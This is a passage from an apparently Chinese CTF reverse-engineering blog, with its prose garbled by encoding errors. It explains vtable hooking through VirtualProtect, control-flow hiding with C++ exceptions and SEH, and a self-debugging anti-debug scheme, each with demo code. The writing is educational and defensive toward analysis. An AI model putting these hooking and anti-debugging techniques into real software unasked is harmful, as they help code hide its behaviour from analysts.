class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vmt_test* test = <span class="keyword">new</span> <span class="built_in">vmt_test</span>();</span><br><span class="line">    test-&gt;<span class="built_in">function1_To_hook</span>();</span><br><span class="line">    test-&gt;<span class="built_in">function2</span>();</span><br><span class="line">    <span class="type">int</span> * Start_address = *(<span class="type">int</span> **)test;</span><br><span class="line">    DWORD old_protect;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">VirtualProtect</span>((LPVOID)Start_address, <span class="built_in">sizeof</span>(<span class="type">void</span> *), PAGE_EXECUTE_READWRITE, &amp;old_protect))&#123;</span><br><span class="line">        <span class="comment">// cout &lt;&lt; &quot;Hooking&quot; &lt;&lt; endl;</span></span><br><span class="line">        *(<span class="type">int</span> *)Start_address = (<span class="type">int</span>)hook;</span><br><span class="line">        <span class="built_in">VirtualProtect</span>((LPVOID)Start_address, <span class="built_in">sizeof</span>(<span class="type">void</span> *), old_protect, &amp;old_protect);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Failed to hook&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    vmt_test* test2 = <span class="keyword">new</span> <span class="built_in">vmt_test</span>();</span><br><span class="line">    test2-&gt;<span class="built_in">function1_To_hook</span>();</span><br><span class="line">    vmt_drivation* drv = <span class="keyword">new</span> <span class="built_in">vmt_drivation</span>();</span><br><span class="line">    drv-&gt;<span class="built_in">function1_To_hook</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œç»“æœ:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\test.exe</span><br><span class="line">Test constructor</span><br><span class="line">Function1 in VMT, Havnt been hooked</span><br><span class="line">Function2 in VMT</span><br><span class="line">Test constructor</span><br><span class="line">Hooked</span><br><span class="line">Test constructor</span><br><span class="line">Function1 in Drivation, Havnt been hooked</span><br></pre></td></tr></table></figure>

<h3 id="ç‰¹å¾"><a href="#ç‰¹å¾" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h3><p>è¦ä½¿ç”¨VMT hookç»•ä¸å¼€çš„ä¸€ç‚¹å°±æ˜¯æ”¹å˜æŸæ®µå†…å­˜çš„æƒé™ å› ä¸ºVMTæ‰€åœ¨çš„æ•°æ®æ®µæ²¡æœ‰å†™å…¥çš„æƒé™ è¿™æ—¶å€™åœ¨Windowsç³»ç»Ÿä¸Šè¦ä½¿ç”¨<code>VirtualProtect()</code>è¿›è¡Œææƒ Linuxä¸Šä½¿ç”¨<code>mprotect()</code>è¿›è¡Œææƒ</p>
<h4 id="2024-DASCTFå…«æœˆå¼€å­¦å­£-ezcpp"><a href="#2024-DASCTFå…«æœˆå¼€å­¦å­£-ezcpp" class="headerlink" title="[2024 DASCTFå…«æœˆå¼€å­¦å­£] ezcpp"></a>[2024 DASCTFå…«æœˆå¼€å­¦å­£] ezcpp</h4><p>ä»¥è¿™é¢˜ä¸ºä¾‹ å®ƒçš„VMT hookå°±éå¸¸çš„æ˜æ˜¾:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-101509.png" alt="image-20240915101509799"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-101527.png" alt="image-20240915101527913"></p>
<p>ä¸¤æ¬¡hookäº†v7çš„VMTä¸­çš„ç¬¬ä¸€ä¸ªè™šå‡½æ•°</p>
<h1 id="C-å¼‚å¸¸å¤„ç†"><a href="#C-å¼‚å¸¸å¤„ç†" class="headerlink" title="C++å¼‚å¸¸å¤„ç†"></a>C++å¼‚å¸¸å¤„ç†</h1><h2 id="try-â€¦-catch-â€¦-â€¦"><a href="#try-â€¦-catch-â€¦-â€¦" class="headerlink" title="try{â€¦}catch(â€¦){â€¦}"></a>try{â€¦}catch(â€¦){â€¦}</h2><p>æœ€ç®€å•çš„ä¸€ç§å¼‚å¸¸å¤„ç†ç±»å‹ IDAå¯ä»¥è½»æ¾è¯†åˆ«å‡º<code>try&#123;&#125;</code>å—å’Œå¯¹åº”çš„<code>catch()&#123;&#125;</code>å— ä»¥ä»¥ä¸‹ä»£ç ç¼–è¯‘å‡ºçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸ºä¾‹:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdexcept&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">int</span> num;</span><br><span class="line">        cin &gt;&gt; num;</span><br><span class="line">        <span class="keyword">if</span>(num)&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;10000 / input = &quot;</span> &lt;&lt; (<span class="number">10000</span> / num) &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="number">0x9961</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span>(...)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Divided by zero!!!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-224828.png" alt="image-20240915224827971"></p>
<p>ä½†æ˜¯IDAçš„ä¼ªä»£ç æ„é€ è¿‡ç¨‹å¹¶ä¸ä¼šå°†å¼‚å¸¸å¤„ç†çš„éƒ¨åˆ†è¿›è¡Œåæ±‡ç¼–å¹¶æ„é€ <code>try-catch</code>å— åªä¼šæ„é€ tryçš„éƒ¨åˆ†:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  _DWORD v7[<span class="number">5</span>]; <span class="comment">// [rsp+2Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(refptr__ZSt3cin, v7);</span><br><span class="line">  <span class="keyword">if</span> ( !v7[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = _cxa_allocate_exception(<span class="number">4uLL</span>);</span><br><span class="line">    *exception = <span class="number">0x9961</span>;</span><br><span class="line">    _cxa_throw(exception, refptr__ZTIi, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="string">&quot;10000 / input = &quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">10000</span> / v7[<span class="number">0</span>]));</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v4, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åº”å¯¹çš„æ–¹æ³•å¾ˆç®€å• å°†<code>throw</code>å…³é”®å­—å¯¹åº”çš„æ±‡ç¼–ç‰‡æ®µç›´æ¥patchä¸º<code>jmp catch_block</code>å³å¯:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-225312.png" alt="image-20240915225312007"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  _DWORD v8[<span class="number">5</span>]; <span class="comment">// [rsp+2Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(refptr__ZSt3cin, v8);</span><br><span class="line">  <span class="keyword">if</span> ( v8[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="string">&quot;10000 / input = &quot;</span>);</span><br><span class="line">    v4 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">10000</span> / v8[<span class="number">0</span>]));</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v4, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    exception = _cxa_allocate_exception(<span class="number">4uLL</span>);</span><br><span class="line">    *exception = <span class="number">0x9961</span>;</span><br><span class="line">    _cxa_begin_catch(exception);</span><br><span class="line">    v7 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="string">&quot;Divided by zero!!!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v7, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);</span><br><span class="line">    _cxa_end_catch();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™ç§é€šè¿‡å¼‚å¸¸å¤„ç†éšè—æ§åˆ¶æµçš„æ–¹æ³•å±€é™æ€§æ˜¯å¾ˆå¤§çš„ ç¬¬ä¸€ç‚¹å°±æ˜¯ç”¨<code>throw</code>å…³é”®å­—æŠ›å‡ºå¼‚å¸¸è¿™ä¸ªç‰¹å¾å¤ªæ˜æ˜¾ è€Œ<code>try-catch</code>ç»“æ„åªèƒ½æ•æ‰åˆ°<code>throw</code>å…³é”®å­—æŠ›å‡ºçš„å¼‚å¸¸ å…¶ä»–çš„è¯¸å¦‚å†…å­˜é”™è¯¯å’Œé™¤é›¶é”™è¯¯ç­‰æ˜¯ä¸ä¼šè¿›è¡Œå¼‚å¸¸å¤„ç†çš„ è¿™å°±è¦æåˆ°ä¸‹é¢è¿™ç§å¼‚å¸¸å¤„ç†æ–¹å¼</p>
<h2 id="try-â€¦-except-â€¦-â€¦-SEH"><a href="#try-â€¦-except-â€¦-â€¦-SEH" class="headerlink" title="__try{â€¦}__except(â€¦){â€¦}	SEH"></a>__try{â€¦}__except(â€¦){â€¦}	SEH</h2><p>è¿™æ˜¯ä¸€ç§åŸºäº<code>TEB</code>(çº¿ç¨‹ç»“æ„)çš„å¼‚å¸¸å¤„ç†æ–¹å¼ å…·ä½“å¯ä»¥å‚è€ƒ<a href="https://www.cnblogs.com/yilang/p/11233935.html">ç»“æ„åŒ–å¼‚å¸¸SEHå¤„ç†æœºåˆ¶è¯¦ç»†ä»‹ç»</a> å¯ä»¥æ•è·åˆ°å‡ºç°çš„æ‰€æœ‰å¼‚å¸¸ ä»¥ä»¥ä¸‹ä»£ç ç¼–è¯‘å‡ºçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸ºä¾‹:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;exception&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">LONG WINAPI <span class="title">Handlers</span><span class="params">(EXCEPTION_POINTERS* pExInfo)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(pExInfo-&gt;ExceptionRecord-&gt;ExceptionCode)&#123;</span><br><span class="line">        <span class="keyword">case</span> EXCEPTION_ACCESS_VIOLATION:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Access Violation\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EXCEPTION_INT_DIVIDE_BY_ZERO:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Divide by Zero\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Unknown Exception\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// SetUnhandledExceptionFilter(Handlers);</span></span><br><span class="line">    __try&#123;</span><br><span class="line">        <span class="type">int</span> zero = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> num = <span class="number">1</span> / zero;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (<span class="built_in">Handlers</span>(<span class="built_in">GetExceptionInformation</span>()))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Exception Handled\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®‰è£…Microsoft C++æ‰©å±•å·¥å…·å ç”¨<code>__except</code>å…³é”®å­—å¯ä»¥æŒ‡å®šå‘ç”Ÿå¼‚å¸¸æ—¶çš„å¼‚å¸¸å¤„ç†å‡½æ•° å½“<code>__try</code>å—ä¸­å‘ç”Ÿå¼‚å¸¸æ—¶å°±ä¼šè¿›å…¥è¿™ä¸ªå¼‚å¸¸å¤„ç†å‡½æ•°å¹¶å°†å‘ç”Ÿçš„å¼‚å¸¸å·ä¼ å…¥<code>pExInfo-&gt;ExceptionRecord-&gt;ExceptionCode</code> å’Œä¸Šé¢çš„å¼‚å¸¸å¤„ç†ä¸€æ · è¿™ç§æ–¹æ³•å¯ä»¥éšè—ç¨‹åºçš„æ§åˆ¶æµ:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;_D589061D_excption_cpp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F16%2F20240916-140102.png" alt="image-20240916140054838"></p>
<p>è€Œä¸”ä¹Ÿå’Œä¸Šé¢çš„å¼‚å¸¸å¤„ç†ä¸€æ ·åœ¨å‘ç”Ÿå¼‚å¸¸æ—¶å³ä½¿æ˜¯æ­¥å…¥è°ƒè¯•ä¹Ÿä¼šç›´æ¥è¿è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹æˆ–ç¨‹åºç»“æŸ è¿™æ—¶å€™è¦æ¢å¤æ§åˆ¶æµå°±éœ€è¦è¯†åˆ«å“ªéƒ¨åˆ†æ˜¯ä¸€å®šä¼šå‘ç”Ÿå¼‚å¸¸çš„ å¹¶å°†é‚£éƒ¨åˆ†patchä¸ºè°ƒç”¨å¼‚å¸¸å¤„ç†å‡½æ•° å’Œè·³è½¬åˆ°<code>__except</code>å—çš„jmpæŒ‡ä»¤ ä½†æ˜¯è¿™æ ·åšæœ‰æ˜æ˜¾çš„å¼Šç«¯:</p>
<ol>
<li>ä¸ä¸€å®šèƒ½ç¡®å®šé‚£ä¸€éƒ¨åˆ†ä¼šå‘ç”Ÿå¼‚å¸¸</li>
<li>ä¼šå‘ç”Ÿå¼‚å¸¸çš„éƒ¨åˆ†ä¸ä¸€å®šæ¯æ¬¡éƒ½å‘ç”Ÿå¼‚å¸¸</li>
<li>åŸæ¥ä¼šè§¦å‘å¼‚å¸¸çš„éƒ¨åˆ†ä¸ä¸€å®šæœ‰è¶³å¤Ÿçš„ç©ºé—´ç”¨æ¥patchæˆä¸¤æ¡æŒ‡ä»¤</li>
</ol>
<p>æ‰€ä»¥ç›®å‰æˆ‘èƒ½æƒ³åˆ°æ¯”è¾ƒå¥½çš„å¤„ç†æ–¹å¼æ˜¯åœ¨å¼‚å¸¸å¤„ç†å‡½æ•°çš„èµ·å§‹åœ°å€ä¸‹æ–­ç‚¹æ¥åŠ¨æ€è°ƒè¯•åˆ†æ è€ŒIDAæ˜¯å¯ä»¥è½»æ¾è¯†åˆ«å‡º<code>__except(handler())</code>ä¸­çš„<code>handler()</code>çš„</p>
<p>æœ€åé™„ä¸Šæ‰€æœ‰<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55">Windowså¼‚å¸¸çŠ¶æ€ç </a></p>
<h1 id="Debug-Blocker"><a href="#Debug-Blocker" class="headerlink" title="Debug-Blocker"></a>Debug-Blocker</h1><p>å®é™…ä¸ŠDebugblockerçš„æ€æƒ³éå¸¸ç®€å• åŒæ—¶ç‰¹å¾ä¹Ÿååˆ†æ˜æ˜¾ å°±æ˜¯æ£€æµ‹è®©ç¨‹åºå¯åŠ¨å¹¶è°ƒè¯•ä¸€ä¸ªå’Œè‡ªå·±ä¸€æ ·çš„çº¿ç¨‹ è¿™æ—¶å€™è™½ç„¶ä¸¤ä¸ªçº¿ç¨‹è¿è¡Œçš„æ˜¯åŒä¸€ä¸ªç¨‹åº ä½†æ˜¯ä¸»è¿›ç¨‹å’Œå­è¿›ç¨‹å› ä¸ºè°ƒè¯•å™¨é™„åŠ åˆ¤æ–­(<code>IsDebuggerPresent()</code>)æ‰§è¡Œçš„æ˜¯å®Œå…¨ä¸åŒçš„ç¨‹åº è€Œé€šè¿‡è·å–ä¸Šä¸‹æ–‡ ä¸»è¿›ç¨‹å¯¹å­è¿›ç¨‹çš„æ§åˆ¶æµæ˜¯å®Œå…¨æ§åˆ¶çš„ è€Œå­è¿›ç¨‹åˆå¯ä»¥é€šè¿‡è§¦å‘å¼‚å¸¸æ¥äº¤ç”±ä¸»è¿›ç¨‹å¤„ç†çš„æ–¹å¼å½¢æˆä¸»è¿›ç¨‹çš„æ§åˆ¶æµ æœ€åè¾¾æˆéšè—æ§åˆ¶æµçš„ç›®çš„ åŒæ—¶å› ä¸ºå­è¿›ç¨‹å·²ç»è¢«é™„åŠ äº†ä¸»è¿›ç¨‹è¿™ä¸ªè°ƒè¯•å™¨ æ­£å¸¸æ¥è¯´æ˜¯ä¸å¯èƒ½å†é™„åŠ è°ƒè¯•å™¨äº† ä»è€Œè¿›ä¸€æ­¥å¢åŠ äº†é€†å‘éš¾åº¦</p>
<p>ç”¨ä»¥ä¸‹ä»£ç ç¼–è¯‘å‡ºçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸ºä¾‹:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> zero = <span class="number">0x100</span>;</span><br><span class="line">CHAR Buffer[<span class="number">0x1000</span>];</span><br><span class="line">HANDLE hThread;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">child</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> z = zero - <span class="number">0x100</span>;</span><br><span class="line">    <span class="type">int</span> get_input = <span class="number">10</span> / z;</span><br><span class="line">    <span class="type">int</span> check = <span class="number">100</span> / z;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">1000</span> / z;</span><br><span class="line">    <span class="type">int</span> exit = <span class="number">100000</span> / z;</span><br><span class="line">    <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">handler</span><span class="params">(DEBUG_EVENT *DebugEvent)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(DebugEvent-&gt;dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[+]Successfully attached to child thread&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    CONTEXT ctx;</span><br><span class="line">    <span class="keyword">if</span>(DebugEvent-&gt;u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)&#123;</span><br><span class="line">        ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line">        <span class="built_in">GetThreadContext</span>(hThread, &amp;ctx);</span><br><span class="line">        <span class="keyword">switch</span>(ctx.Rax)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10</span>:&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;[+]Get input:&quot;</span>;</span><br><span class="line">                cin &gt;&gt; Buffer;</span><br><span class="line">                ctx.Rip += <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">100</span>:&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;[+]Checking...&quot;</span> &lt;&lt; endl;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">memcmp</span>(Buffer, <span class="string">&quot;test&quot;</span>, <span class="number">4</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                    ctx.Rax = <span class="number">1000</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    ctx.Rax = <span class="number">10000</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ctx.Rip += <span class="number">11</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1000</span>:&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;[+]Correct!&quot;</span> &lt;&lt; endl;</span><br><span class="line">                ctx.Rip += <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">10000</span>:&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;[+]Incorrect!&quot;</span> &lt;&lt; endl;</span><br><span class="line">                ctx.Rip += <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">100000</span>:&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;[-]Terminal&quot;</span> &lt;&lt; endl;</span><br><span class="line">                ctx.Rip += <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">default</span>:&#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;[!]Unknown op&quot;</span> &lt;&lt; endl;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">SetThreadContext</span>(hThread, &amp;ctx);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">IsDebuggerPresent</span>())&#123;</span><br><span class="line">        <span class="built_in">child</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    STARTUPINFOA si;</span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    CHAR SelfPath[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">GetModuleFileNameA</span>(<span class="literal">NULL</span>, SelfPath, <span class="built_in">sizeof</span>(SelfPath));</span><br><span class="line">    DEBUG_EVENT DebugEvent;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">CreateProcessA</span>(SelfPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, DEBUG_ONLY_THIS_PROCESS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))&#123;</span><br><span class="line">        hThread = pi.hThread;</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">WaitForDebugEvent</span>(&amp;DebugEvent, INFINITE))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">handler</span>(&amp;DebugEvent))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">ContinueDebugEvent</span>(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!]Failed to create process&quot;</span>);</span><br><span class="line">    <span class="built_in">ExitProcess</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨çº¿ç¨‹æ—¶ä¼šç›´æ¥è§¦å‘ä¸€ä¸ªCREATE_PROCESS_DEBUG_EVENT(0x3)çš„äº‹ä»¶ å½“å­è¿›ç¨‹è§¦å‘é™¤é›¶å¼‚å¸¸æ—¶<code>handler()</code>å°±ä¼šè·å–å½“æ—¶çš„ä¸Šä¸‹æ–‡å¹¶æ ¹æ®RAX(é™¤æ•°)æ¥è¿›è¡Œå¯¹åº”çš„å¤„ç† å¹¶åœ¨å¤„ç†å®Œåæ›´æ”¹ä¸Šä¸‹æ–‡ä¸­çš„RAX, RIPå¹¶è®¾ç½®:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-120734.png" alt="image-20240928120734385"></p>
<p>è¿è¡Œç»“æœ:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-121133.png" alt="image-20240928121133432"></p>
<p>åŠ¨æ€è°ƒè¯•å­çº¿ç¨‹çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å• Cheat Engineæœ‰ä¸€ä¸ª<a href="https://www.cheatengine.org/aboutdbvm.php">DBVM</a>åŠŸèƒ½ ç®€å•æ¥è¯´å°±æ˜¯ä¸€ä¸ªæç®€åŒ–çš„è™šæ‹Ÿæœº åœ¨é‡Œé¢è¿è¡ŒWindowsç¨‹åºå¯ä»¥è®©CEçš„è°ƒè¯•å™¨é™„åŠ åˆ°ä»»æ„çº¿ç¨‹ä¸Š ä¸”ä¸å½±å“åŸç¨‹åºçš„æ‰§è¡Œ </p>
<h2 id="2024-LineCTF-BrownFlagChecker"><a href="#2024-LineCTF-BrownFlagChecker" class="headerlink" title="[2024 LineCTF] BrownFlagChecker"></a>[2024 LineCTF] BrownFlagChecker</h2><p>ç›´æ¥çœ‹ä¼ªä»£ç :</p>
